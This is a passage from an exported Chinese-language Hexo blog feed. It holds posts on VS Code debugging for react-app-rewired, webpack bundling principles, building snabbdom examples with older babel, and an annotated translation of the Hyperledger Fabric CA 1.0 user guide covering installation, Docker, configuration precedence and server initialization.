<h3 id="create-react-app-rewired"><a href="#create-react-app-rewired" class="headerlink" title="create-react-app-rewired"></a>create-react-app-rewired</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;node&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;request&quot;</span>: <span class="string">&quot;launch&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Launch Program&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;runtimeExecutable&quot;</span>: <span class="string">&quot;$&#123;workspaceFolder&#125;/node_modules/react-app-rewired/bin/index.js&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;args&quot;</span>: [<span class="string">&quot;start&quot;</span>],</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

<h3 id="通过npm命令"><a href="#通过npm命令" class="headerlink" title="通过npm命令"></a>通过npm命令</h3><p>TODO:暂未成功</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Launch via npm&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;node&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;request&quot;</span>: <span class="string">&quot;launch&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;cwd&quot;</span>: <span class="string">&quot;$&#123;workspaceFolder&#125;&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;runtimeExecutable&quot;</span>: <span class="string">&quot;npm&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;runtimeArgs&quot;</span>: [<span class="string">&quot;run-script&quot;</span>, <span class="string">&quot;start&quot;</span>],</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>以react-app-rewired为例, 在<code>override-config.js</code>中打断点就可以.</p>
]]></content>
  </entry>
  <entry>
    <title>打包原理(webpack系列-1)</title>
    <url>/2020/11/04/basic-webpack-webpack-series-1/</url>
    <content><![CDATA[<h1 id="ABSTRACT"><a href="#ABSTRACT" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h1><p>  本文主要介绍webpack基本的打包原理.</p>
<p>  打包主要三个步骤: </p>
<ol>
<li><p>转换代码</p>
</li>
<li><p>生成依赖图</p>
</li>
<li><p>生成代码字符串</p>
<p>然后通过<code>require</code>函数将代码组织到bundle(代码块)中,就齐活了</p>
</li>
</ol>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><a href="https://juejin.im/post/6844903858179670030">https://juejin.im/post/6844903858179670030</a> :  提供的主要思路</li>
<li><a href="https://github.com/airuikun/blog/issues/4">https://github.com/airuikun/blog/issues/4</a> : 这个讲的比第一个详细</li>
<li><a href="https://zhuanlan.zhihu.com/p/107125345">https://zhuanlan.zhihu.com/p/107125345</a> : 这个排版和代码看着更舒服. 可以合1,2结合看</li>
<li><a href="https://aotu.io/notes/2020/07/17/webpack-analize/index.html">https://aotu.io/notes/2020/07/17/webpack-analize/index.html</a> 这个实践不错</li>
</ol>
]]></content>
      <tags>
        <tag>webpack</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2019/01/12/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.<br>测试页面!!!<br>刚刚从jekyll迁移过来, 需要继续修改</p>
]]></content>
  </entry>
  <entry>
    <title>运行snabbdom的示例</title>
    <url>/2019/04/02/%E8%BF%90%E8%A1%8Csnabdom%E7%A4%BA%E4%BE%8B/</url>
    <content><![CDATA[<h2 id="1-Abstract"><a href="#1-Abstract" class="headerlink" title="1. Abstract"></a>1. Abstract</h2><p>本文介绍如何运行snabbdom的示例。</p>
<a id="more"></a>
<h2 id="2-Introduction"><a href="#2-Introduction" class="headerlink" title="2. Introduction"></a>2. Introduction</h2><p>vue的Virtual DOM是基于snabbdom。所以，要了解vue，先了解snabbdom也有必要。</p>
<h2 id="3-环境配置"><a href="#3-环境配置" class="headerlink" title="3. 环境配置"></a>3. 环境配置</h2><p>这一部分其实是本文的重点。因为snabbdom的开发年代相距想在（2019.04）比较久远。而且snabbdom是用typescript开发的，比JavaScript的上手难度要大一点。</p>
<h3 id="3-1-配置babel"><a href="#3-1-配置babel" class="headerlink" title="3.1 配置babel"></a>3.1 配置babel</h3><p>babel是一个代码转换工具，不同的版本各有差异。如果直接使用现在的版本，编译之前的代码，会有莫名其妙的错误，所以考虑使用使用sanbbdom时代的babel</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install --save-dev babel-preset-es2015</span><br><span class="line">echo &#39;&#123; &quot;presets&quot;: [&quot;es2015&quot;] &#125;&#39; &gt; .babelrc &#x2F;&#x2F;这俩不用纠结，直接安装</span><br><span class="line">npm install --save-dev babelify &#x2F;&#x2F; 我当前的（2019-03-05）是babel10. 不能用</span><br><span class="line">npm uninstall babelify &#x2F;&#x2F;卸载</span><br><span class="line">npm install babelify@8 &#x2F;&#x2F; 按照提示</span><br><span class="line">npm install babel-core &#x2F;&#x2F; 按照提示</span><br></pre></td></tr></table></figure>
<h2 id="4-编译代码"><a href="#4-编译代码" class="headerlink" title="4. 编译代码"></a>4. 编译代码</h2><p>研究一下package.json中的命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;compile&quot;: &quot;npm run compile-es &amp;&amp; npm run compile-commonjs&quot;,</span><br><span class="line">&quot;compile-es&quot;: &quot;tsc --outDir es --module es6 --moduleResolution node&quot;, &#x2F;&#x2F; es6的模块语法</span><br><span class="line">&quot;compile-commonjs&quot;: &quot;tsc --outDir .&#x2F;commonjs&quot;,  &#x2F;&#x2F; 用于在浏览器中require引用</span><br><span class="line">&quot;prepublish&quot;: &quot;npm run compile&quot;,</span><br></pre></td></tr></table></figure>
<p>为了配合example中的require，使用<code>npm run compile-commonjs</code>。编译完之后，代码结构如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── commonjs &#x2F;&#x2F;刚刚生成的文件</span><br><span class="line">├── dist </span><br><span class="line">├── es &#x2F;&#x2F; 执行 npm run compile-es生成的文件</span><br><span class="line">├── examples</span><br><span class="line">├── package-lock.json</span><br><span class="line">├── package.json</span><br><span class="line">├── src</span><br></pre></td></tr></table></figure>
<h2 id="5-示例使用"><a href="#5-示例使用" class="headerlink" title="5. 示例使用"></a>5. 示例使用</h2><h3 id="5-1-新的示例"><a href="#5-1-新的示例" class="headerlink" title="5.1 新的示例"></a>5.1 新的示例</h3><p>以下是对示例代码稍作修改生成的示例：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> snabbdom = <span class="built_in">require</span>(<span class="string">&#x27;../../commonjs/snabbdom.js&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> patch = snabbdom.init([</span><br><span class="line">  <span class="built_in">require</span>(<span class="string">&#x27;../../commonjs/modules/class&#x27;</span>).default, <span class="comment">// makes it easy to toggle classes</span></span><br><span class="line">  <span class="built_in">require</span>(<span class="string">&#x27;../../commonjs/modules/props&#x27;</span>).default, <span class="comment">// for setting properties on DOM elements</span></span><br><span class="line">]);</span><br><span class="line"><span class="keyword">var</span> h = <span class="built_in">require</span>(<span class="string">&#x27;../../commonjs/h&#x27;</span>).default; <span class="comment">// helper function for creating vnodes</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&quot;DOMContentLoaded&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> container = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;container&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> vnode = h(<span class="string">&#x27;div#container.two.classes&#x27;</span>,  [</span><br><span class="line">    h(<span class="string">&#x27;span&#x27;</span>, <span class="string">&#x27;This is bold &#x27;</span>),</span><br><span class="line">    <span class="string">&#x27; and this is just normal text&#x27;</span>,</span><br><span class="line">    h(<span class="string">&#x27;a&#x27;</span>,  <span class="string">&quot;I&#x27;ll take you places!&quot;</span>)</span><br><span class="line">  ]);</span><br><span class="line">  <span class="comment">// Patch into empty DOM element – this modifies the DOM as a side effect</span></span><br><span class="line">  patch(container, vnode);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h3 id="5-2-示例编译"><a href="#5-2-示例编译" class="headerlink" title="5.2 示例编译"></a>5.2 示例编译</h3><p>利用babel将require的库文件编译为一个文件使用。找到一个这样的<a href="https://github.com/snabbdom/snabbdom/issues/263">关于如何编译的github的issue</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">§ ./node_modules/.bin/browserify examples/carousel-svg/script.js -t babelify -o examples/carousel-svg/build.js //我的browserify没有全局安装</span><br></pre></td></tr></table></figure>
<p>之后在HTML文件中直接引入编译好的build.js文件就可以啦。</p>
<h2 id="6-summary"><a href="#6-summary" class="headerlink" title="6. summary"></a>6. summary</h2><p>主要记录了在学习snabbdom源码中遇到的babel版本及代码编译的问题。</p>
<h2 id="7-参考"><a href="#7-参考" class="headerlink" title="7. 参考"></a>7. 参考</h2><ol>
<li><a href="https://github.com/snabbdom/snabbdom/issues/263">关于如何编译的github的issue</a></li>
</ol>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>snabbdom</tag>
      </tags>
  </entry>
  <entry>
    <title>hyperledger-fabric-ca用户指南(1.0)</title>
    <url>/2018/06/05/hyperledger-fabric-ca%E7%94%A8%E6%88%B7%E6%8C%87%E5%8D%97(1.0)/</url>
    <content><![CDATA[<h1 id="fabric-ca-的用户指南-1-0版"><a href="#fabric-ca-的用户指南-1-0版" class="headerlink" title="fabric ca 的用户指南(1.0版)"></a>fabric ca 的用户指南(1.0版)</h1><h2 id="摘要："><a href="#摘要：" class="headerlink" title="摘要："></a>摘要：</h2><p>这篇文章是翻译自<a href="https://hyperledger-fabric-ca.readthedocs.io/en/release-1.0/">hyperledger farbric ca</a>的文档。记录了自己实践文档内容过程中，遇到一些问题以及解决办法。相关的内容在<code>注释</code>中</p>
<p>hyperledger fabric ca是一个对hyperledger fabric进行用户授权的组件.</p>
<p>他提供了以下的特性:</p>
<ul>
<li>身份注册,或者连接到ldap作为用户注册中心.</li>
<li>颁发登录证书(ECerts)</li>
<li>颁发交易证书(Tcerts), 当在Hyperledger fabric 区块链中交易的时候, 提供匿名和不可连接的连接.</li>
<li>证书更新和撤回</li>
</ul>
<p>Hyperledger fabric ca 包含服务端和一个客户端, 下文将会描述.</p>
<p>对于贡献Hyperledger fabric ca 的开发者, 可以查看 <a href="https://github.com/hyperledger/fabric-ca">fabric ca 仓库</a>来查询更多信息.</p>
<a id="more"></a>

<h1 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h1><p>下图展示了如何把hyperledger fabric ca 服务器放在hyperledger fabric 的整体架构中.</p>
<p><img src="./fabric-ca-arch.png" alt="img"> </p>
<p> 有两个方式与fabric ca服务器端交互:通过fabric ca的客户端或者sdk.所有的与服务端的交互都是通过rest api.可以查看<a href="https://github.com/hyperledger/fabric-ca/blob/release-1.1/swagger/swagger-fabric-ca.json">fabric-ca/swagger/swagger-fabric-ca.json</a> 这份文档来查看文档化的REST API.</p>
<p> 客户端或者sdk可以连接一个ca服务器端的集群的某一台服务器.上图右上边说明的是这个部分. 客户端使用haproxy代理做负载均衡,连接到fabric ca server的集群中的一个.</p>
<p> 所有的ca服务端共用一个数据库, 来跟踪身份和证书.如果配置了LDAP,用户身份验证信息就会存放在ldap中, 而不是数据库.</p>
<p> 每个服务器可能包含多个ca.每个ca要么是根ca,要么是中间ca.每个中间ca的父节点要么是根ca,要么是一个中间ca.</p>
<h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><h2 id="预安装"><a href="#预安装" class="headerlink" title="预安装"></a>预安装</h2><ul>
<li>go.x 安装</li>
<li>正确设置环境变量 <code>GOPATH</code></li>
<li>安装libtool 和libtdhl-dev 安装包</li>
</ul>
<blockquote>
<p>注释:</p>
</blockquote>
<ul>
<li>如何设置gopath:<a href="https://segmentfault.com/a/1190000003933557">https://segmentfault.com/a/1190000003933557</a></li>
<li>一般来说, GOPATH的路径是/users/{用户名}/go.里面存储了golang的依赖包和一些可执行命令.依赖包的路径是$GOPATH/src,使用go get命令下载的包, 也是默认存在这里.可执行命令的包一般是在$GOPATH/bin.mac推荐使用homebrew安装</li>
</ul>
<p>以下的命令是在ubuntu 上安装libtool的依赖包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt install libtool libltdl-dev</span><br></pre></td></tr></table></figure>

<p>以下的命令是在macox安装libtool依赖:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">brew install libtool</span><br></pre></td></tr></table></figure>

<blockquote>
<p>说明:<br>对于mac,如果使用homebrew安装了libtool, 就不需要再安装libtdl-dev</p>
</blockquote>
<p>关于libtool的信息, 可以查看: <a href="https://www.gnu.org/software/libtool">https://www.gnu.org/software/libtool</a>.</p>
<p>关于libltdl-dev的信息, 可以查看:<br><a href="https://www.gnu.org/software/libtool/manual/html_node/Using-libltdl.html">https://www.gnu.org/software/libtool/manual/html_node/Using-libltdl.html</a></p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>下面的命令会在会在$GOPATH/bin中安装fabric-ca-server和fabric-ca-client的二进制文件.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">go get -u github.com&#x2F;hyperledger&#x2F;fabric-ca&#x2F;cmd&#x2F;...</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注释:<br><code>go get -u</code>是u的意思是升级, 如果包已经在本地, 就不下载,如果没有才下载</p>
</blockquote>
<blockquote>
<p>说明: 如果你clone了fabric-ca 的仓库,在运行go get 命令之前 确保你在master 分支,否则你可能会看到这样的错误: </p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;gopath&gt;/src/github.com/hyperledger/fabric-ca; git pull --ff-only</span><br><span class="line">There is no tracking information <span class="keyword">for</span> the current branch.</span><br><span class="line">Please specify <span class="built_in">which</span> branch you want to merge with.</span><br><span class="line">See git-pull(1) <span class="keyword">for</span> details.</span><br><span class="line"></span><br><span class="line">    git pull &lt;remote&gt; &lt;branch&gt;</span><br><span class="line"></span><br><span class="line">If you wish to <span class="built_in">set</span> tracking information <span class="keyword">for</span> this branch you can <span class="keyword">do</span> so with:</span><br><span class="line"></span><br><span class="line">    git branch --set-upstream-to=&lt;remote&gt;/&lt;branch&gt; tlsdoc</span><br><span class="line"></span><br><span class="line">package github.com/hyperledger/fabric-ca/cmd/fabric-ca-client: <span class="built_in">exit</span> status 1</span><br></pre></td></tr></table></figure>

<h2 id="启动原生的服务器"><a href="#启动原生的服务器" class="headerlink" title="启动原生的服务器"></a>启动原生的服务器</h2><p>这个命令使用默认配置,其中fabric-ca-server</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fabric-ca-server start -b admin:adminpw</span><br></pre></td></tr></table></figure>
<p>-b选项 是提供引导管理员用户(fabric中默认存在第一个用户)的登录id和密码.如果在关于ldap的配置中没有使用ldap.enabled设置, 这个选项就是必须的.</p>
<blockquote>
<p> 注释: ldap的作用是接管fabric-ca中用户注册的功能, 所有的fabric-ca的用户都是在ldap中,所以不需要提供引导用户.</p>
</blockquote>
<p>以上操作会创建一份叫做fabric-ca-server-config.yml的文件, 我们可以对这份文件进行定义.</p>
<blockquote>
<p> 注释: 创建的fabric-ca的配置文件一般会在/etc/hyperledger/fabric-ca-server</p>
</blockquote>
<h2 id="使用docker"><a href="#使用docker" class="headerlink" title="使用docker"></a>使用docker</h2><h3 id="docker-hub"><a href="#docker-hub" class="headerlink" title="docker hub"></a>docker hub</h3><p>在 <a href="https://hub.docker.com/r/hyperledger/fabric-ca/tags/">https://hub.docker.com/r/hyperledger/fabric-ca/tags/</a> 这个网页找到合适的架构和版本的镜像</p>
<p>在$GOPATH/src/github.com/hyperledger/fabric-ca/docker/server 打开docker-compose.yml文件.</p>
<p>把这个配置里面的image选项换成之前相应的标记.下面的文件是给x86架构的beta版本</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">fabric-ca-server:</span></span><br><span class="line">  <span class="attr">image:</span> <span class="string">hyperledger/fabric-ca:x86_64-1.0.0-beta</span></span><br><span class="line">  <span class="attr">container_name:</span> <span class="string">fabric-ca-server</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;7054:7054&quot;</span></span><br><span class="line">  <span class="attr">environment:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">FABRIC_CA_HOME=/etc/hyperledger/fabric-ca-server</span></span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;./fabric-ca-server:/etc/hyperledger/fabric-ca-server&quot;</span></span><br><span class="line">  <span class="attr">command:</span> <span class="string">sh</span> <span class="string">-c</span> <span class="string">&#x27;fabric-ca-server start -b admin:adminpw&#x27;</span></span><br></pre></td></tr></table></figure>

<p>打开docker-compose.yml文件路径所在一个终端.执行下面的命令:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注释: docker-compose的命令常用的有两个, 一个是<code>docker-compose up</code>, 用户启动docker多容器, 另一个是<code>docker-composer down</code>, 用于关闭docker多容器</p>
</blockquote>
<p>如果指定的fabric-ca镜像不存在, 这会从docker拉取(pull)镜像, 然后开启一个fabric-ca 的服务器的实例.</p>
<h3 id="生成自己的docker镜像"><a href="#生成自己的docker镜像" class="headerlink" title="生成自己的docker镜像"></a>生成自己的docker镜像</h3><p>你可以使用下面的命令, 通过docker-compose 来启动服务器.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="variable">$GOPATH</span>/src/github.com/hyperledger/fabric-ca</span><br><span class="line">make docker</span><br><span class="line"><span class="built_in">cd</span> docker/server</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<p>hyperledger/fabric-ca的docker镜像包含了fabric-ca-server和fabric-ca-client</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># cd $GOPATH&#x2F;src&#x2F;github.com&#x2F;hyperledger&#x2F;fabric-ca</span><br><span class="line"># FABRIC_CA_DYNAMIC_LINK&#x3D;true make docker</span><br><span class="line"># cd docker&#x2F;server</span><br><span class="line"># docker-compose up -d</span><br></pre></td></tr></table></figure>


<h2 id="浏览cli命令"><a href="#浏览cli命令" class="headerlink" title="浏览cli命令"></a>浏览cli命令</h2><p>这一部分只是简单说明fabric ca 服务端和客户端的使用信息.另外的使用信息在接下来的部分中.</p>
<blockquote>
<p>注释:<br>这部分内容请参考源文档:<a href="https://hyperledger-fabric-ca.readthedocs.io/en/release-1.0/users-guide.html#explore-the-fabric-ca-cli">https://hyperledger-fabric-ca.readthedocs.io/en/release-1.0/users-guide.html#explore-the-fabric-ca-cli</a></p>
</blockquote>
<blockquote>
<p> 说明: 使用字符串分割的命令行选项可以使用逗号分隔符来指定多个命令, 或者多次指定这个选项,每个字符串值来组成一个列表.比如, 为了给csr.host指定host1和host2,你可以传递参数 –csr.host ‘host1,host2’ 或者 -csr.host host1 –csr.host host2. 当使用第一种的时候, 确保在逗号的前面和后面都没有空格.</p>
</blockquote>
<h1 id="文件格式"><a href="#文件格式" class="headerlink" title="文件格式"></a>文件格式</h1><h2 id="fabric-ca服务器端的配置文件的格式"><a href="#fabric-ca服务器端的配置文件的格式" class="headerlink" title="fabric ca服务器端的配置文件的格式"></a>fabric ca服务器端的配置文件的格式</h2><p>在fabric-ca启动的时候,会在服务端的主目录创建一份默认配置文件.</p>
<blockquote>
<p>注释: 这部分内容查看原文件<a href="https://hyperledger-fabric-ca.readthedocs.io/en/release-1.0/users-guide.html#fabric-ca-server-s-configuration-file-format">https://hyperledger-fabric-ca.readthedocs.io/en/release-1.0/users-guide.html#fabric-ca-server-s-configuration-file-format</a></p>
</blockquote>
<h2 id="ca-客户端的配置文件的格式"><a href="#ca-客户端的配置文件的格式" class="headerlink" title="ca 客户端的配置文件的格式"></a>ca 客户端的配置文件的格式</h2><p>在client端的主目录会创建一份默认的配置文件</p>
<blockquote>
<p>注释: 这部分内容查看原文件<a href="https://hyperledger-fabric-ca.readthedocs.io/en/release-1.0/users-guide.html#fabric-ca-server-s-configuration-file-format">https://hyperledger-fabric-ca.readthedocs.io/en/release-1.0/users-guide.html#fabric-ca-server-s-configuration-file-format</a></p>
</blockquote>
<h1 id="配置文件生效的优先级"><a href="#配置文件生效的优先级" class="headerlink" title="配置文件生效的优先级"></a>配置文件生效的优先级</h1><p>fabric ca提供三种方式来设置fabric ca 服务端和客户端.优先级如下:</p>
<ol>
<li>命令行里面的参数设置</li>
<li>环境变量</li>
<li>配置文件</li>
</ol>
<p>在这个文档后面部分中, 我们修改配置文件.但是,配置文件可能被环境变量和命令行参数覆盖.</p>
<p>比如说, 你有如下的客户端配置文件:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tls:</span><br><span class="line">  # Enable TLS (default: false)</span><br><span class="line">  enabled: false</span><br><span class="line"></span><br><span class="line">  # TLS for the client&#39;s listenting port (default: false)</span><br><span class="line">  certfiles:</span><br><span class="line">  client:</span><br><span class="line">    certfile: cert.pem</span><br><span class="line">    keyfile:</span><br></pre></td></tr></table></figure>
<p>下面的环境变量可能会覆盖配置文件中的 cert.pem.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> FABRIC_CA_CLIENT_TLS_CLIENT_CERTFILE=cert2.pem</span><br></pre></td></tr></table></figure>

<p>如果你想覆盖环境变量和配置文件, 你可以使用命令行参数.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fabric-ca-client enroll --tls.client.certfile cert3.pem</span><br></pre></td></tr></table></figure>

<p>同样的方式也适用于fabric-ca-server,除了把环境变量前缀从<code>FABRIC_CA_CLIENT</code>改成<code>FARBIC_CA_SERVER</code>.</p>
<h1 id="关于文件路径的说明"><a href="#关于文件路径的说明" class="headerlink" title="关于文件路径的说明"></a>关于文件路径的说明</h1><p>所有在fabric ca 服务端和客户端的配置文件中关于文件名字的属性,都可以支持相对路径和绝对路径.相对路径是相对于配置文件所在的配置目录.例如, 如果配置文件是在 <code>~/config</code>中,, tls的设置下面所示,那么fabric ca 服务端和客户端会在<code>~/config</code>目录中查找root.pem, 在<code>~/config/certs</code> 这个目录中查找cert.pem, 使用绝对路径在<code>/abs/path</code>中查找key.pem</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">tls:</span></span><br><span class="line">  <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">certfiles:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">root.pem</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">certfile:</span> <span class="string">certs/cert.pem</span></span><br><span class="line">    <span class="attr">keyfile:</span> <span class="string">/abs/path/key.pem</span></span><br></pre></td></tr></table></figure>

<h1 id="fabric-ca-服务器端"><a href="#fabric-ca-服务器端" class="headerlink" title="fabric ca 服务器端"></a>fabric ca 服务器端</h1><p>可以在启动fabric ca 服务器之前初始化,这样就可以在启动服务器之前生成一个服务器的默认配置文件,可以查看和修改.</p>
<p>ca的主文录由下面决定:</p>
<ul>
<li>FABRIC_CA_SERVER_HOME 的环境变量</li>
<li>FABRIC_CA_HOME 环境变量</li>
<li>CA_CFG_PATH 的环境变量</li>
<li>当前的目录</li>
</ul>
<p>下面假设设置的<code>FABRIC_CA_HOME</code>的环境变量的值为<code>$home/fabric-ca/server</code>.</p>
<p>下面的介绍中, 假设服务器端配置文件已经在服务器的主目录中存在.</p>
<h2 id="初始化服务器端"><a href="#初始化服务器端" class="headerlink" title="初始化服务器端"></a>初始化服务器端</h2><p>使用如下命令初始化fabric ca 服务器:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fabric-ca-server init -b admin:adminpw</span><br></pre></td></tr></table></figure>

<p>当不使用LDAP的时候, -b这个参数必须要有.为了启动一个fabric ca 服务器, 至少需要一个启动实体.-b 这个参数指定了一个启动的身份.这个用户就是server的管理者.</p>
<p>服务器的配置文件包含了可以配置的证书签名请求部分(csr).下面是一个csr的例子:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cn: fabric-ca-server</span><br><span class="line">names:</span><br><span class="line">   - C: US</span><br><span class="line">     ST: &quot;North Carolina&quot;</span><br><span class="line">     L:</span><br><span class="line">     O: Hyperledger</span><br><span class="line">     OU: Fabric</span><br><span class="line">hosts:</span><br><span class="line">  - host1.example.com</span><br><span class="line">  - localhost</span><br><span class="line">ca:</span><br><span class="line">   expiry: 131400h</span><br><span class="line">   pathlength: 1</span><br></pre></td></tr></table></figure>

<p>上面所有的部分都属于在x509标准,这个在执行<code>fabric-ca-server init</code>中产生.这些会相应存在于的在server的配置文件ca.certfile和ca.keyfile中.配置文件中的字段含义如下:</p>
<ul>
<li>cn: 公共的名字</li>
<li>O: 组织名称</li>
<li>OU: 组织单位</li>
<li>L:位置或者城市</li>
<li>ST: 状态</li>
<li>C: 国家</li>
</ul>
<p>如果需要自定义csr,需要自定义配置文件,先删除ca.certfile和ca-keyfile,然后再次运行 fabric-ca-server init -b admin:adminpw</p>
<blockquote>
<p>注释:<br>第一次执行fabric-ca-server inti 的时候, 使用默认的配置, 生成了一个ca.certfile和ca-keyfile. 这两个文件是由csr这部分参数生成的.所以, 如果用自己的cn, ou等,就要先把csr改成自己组织的信息, 然后重新生成.生成的证书文件是在<code>/etc/hyperledger/fabric-ca-server-config/org1.example.com-cert.pem</code>这个文件.<br>关键信息是Issuer发证机构和Subject(证书持有者)的cn(common name)<br><img src="server-init-cert.png"><br>暂时还没弄明白这个证书是用在哪里</p>
</blockquote>
<p>fabric-ca-server会产生一个自签名的ca证书,除非在指定了 -u <parent-fabric-ca-server-URL>. 如果指定-u, 服务器的ca证书就会被父级fabric ca 服务器签名.为了收到来自父级的授权,指定的url必须是<code>&lt;scheme&gt;://&lt;enrollmentID&gt;:&lt;secret&gt;@&lt;host&gt;:&lt;port&gt;</code>这种格式.这里的enrollmentID和secret对应于一个用户, 这个用户的‘hf.IntermediateCA的属性值是true.fabric-ca-server init命令还会在server的home目录生成一个叫做fabric-ca-server.yaml的配置文件.</p>
<p>如果想要用自己的ca签名证书, 必须把你的文件放到相应的ca.certfile和ca.keyfile文件中.两个文件必须是PEM编码, 而且不能加密.而且, 这个ca证书文件必须又<code>-----BEGIN CERTIFICATE-----</code>开始,秘钥的内容必须<code>-----BEGIN PRIVATE KEY-----</code>开始, 而不能是 <code>-----BEGIN ENCRYPTED PRIVATE KEY-----</code></p>
<h3 id="算法和key的大小"><a href="#算法和key的大小" class="headerlink" title="算法和key的大小"></a>算法和key的大小</h3><p>csr部分可以自定义来生成x.509格式的椭圆曲线法生成的证书和秘钥(ECDSA).下面的设置是一个椭圆曲线法的实现的例子, 使用曲线 prime256v1和签名算法 ecdsa-with-SHA256:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">key:</span><br><span class="line">   algo: ecdsa</span><br><span class="line">   size: 256</span><br></pre></td></tr></table></figure>

<p>算法和秘钥的选择取决于你的安全需求.<br>椭圆曲线法提供了如下的秘钥大小选项:</p>
<table>
<thead>
<tr>
<th align="center">大小</th>
<th align="center">ASN1 OID</th>
<th align="center">签名算法</th>
</tr>
</thead>
<tbody><tr>
<td align="center">256</td>
<td align="center">prime256v1</td>
<td align="center">ecdsa-with-SHA256</td>
</tr>
<tr>
<td align="center">384</td>
<td align="center">secp384r1</td>
<td align="center">ecdsa-with-SHA384</td>
</tr>
<tr>
<td align="center">521</td>
<td align="center">secp521r1</td>
<td align="center">ecdsa-with-SHA512</td>
</tr>
</tbody></table>
<h2 id="开启服务器"><a href="#开启服务器" class="headerlink" title="开启服务器"></a>开启服务器</h2><p>使用如下命令开启服务器:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fabric-ca-server start -b &lt;admin&gt;:&lt;adminpw&gt;</span><br></pre></td></tr></table></figure>

<p>如果server之前没有初始化,他会在第一次启动的时候初始化.在初始化的时候,如果ca-pert.pem和ca-key.pem文件不存在, server会产生各自生成一份.如果默认的配置文件不存在,也会生成一份.</p>
<p>除非使用ldap,否则至少一个预先注册的实体来注册和登录其他用户.-b 选项指定了启动实体的名字和密码.</p>
<p>为了监听https而不是http,需要把tls.enable设置为true.</p>
<p>为了限制相同密码登录的次数,registry.maxenrollments设置为合适的数字.如果设置1, 只能登录一次,如果设置-1,可以无限制登录.默认值-1.设置为0,就会禁止任何实体的登录和注册.</p>
<p>fabric-ca-server监听在7054端口</p>
<h2 id="配置数据库"><a href="#配置数据库" class="headerlink" title="配置数据库"></a>配置数据库</h2><p>这一部分描述如何配置连接PostgreSQL or MySQL数据库.默认的数据库是sqlite,默认的数据库文件是fabric-server.db,在home文件夹.</p>
<p>如果不关心在集群中运行服务器,可以跳过这一部分.支持的数据库版本</p>
<ul>
<li>PostgreSQL:.5 或者之后</li>
